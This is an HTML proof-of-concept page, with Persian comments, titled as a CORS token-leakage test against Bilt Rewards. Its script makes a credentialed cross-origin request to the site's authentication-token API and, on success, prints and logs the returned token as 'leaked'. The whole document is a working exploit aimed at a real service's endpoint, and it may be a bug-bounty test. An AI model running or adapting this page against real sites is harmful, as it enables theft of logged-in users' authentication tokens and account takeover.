<!DOCTYPE html>
<html>
<head>
    <title>CORS Exploit Test - Bilt Rewards</title>
</head>
<body>
    <h1>CORS Token Leakage Test</h1>
    <div id="result">در حال تلاش برای دریافت توکن...</div>

    <script>
        const targetUrl = "https://www.bilt.com/api/id/public/user/authentication/token";

        // ایجاد درخواست با استفاده از XMLHttpRequest برای بررسی دقیق‌تر هدرها
        var xhr = new XMLHttpRequest();
        
        xhr.open("GET", targetUrl, true);
        
        // ارسال کوکی‌ها و اطلاعات احراز هویت (بسیار مهم برای حمله CORS)
        xhr.withCredentials = true;

        xhr.onreadystatechange = function() {
            if (xhr.readyState == 4) {
                if (xhr.status == 200) {
                    // اگر پاسخ با موفقیت دریافت شود، توکن نشت پیدا کرده است
                    document.getElementById("result").innerHTML = 
                        "<h3>Success! Token Leaked:</h3><pre>" + xhr.responseText + "</pre>";
                    console.log("Leaked Data:", xhr.responseText);
                } else {
                    document.getElementById("result").innerHTML = 
                        "خطا در دریافت پاسخ. وضعیت: " + xhr.status + 
                        "<br>احتمالاً CORS به درستی پیکربندی شده یا شما لاگین نیستید.";
                }
            }
        };

        xhr.send();
    </script>
</body>
</html>
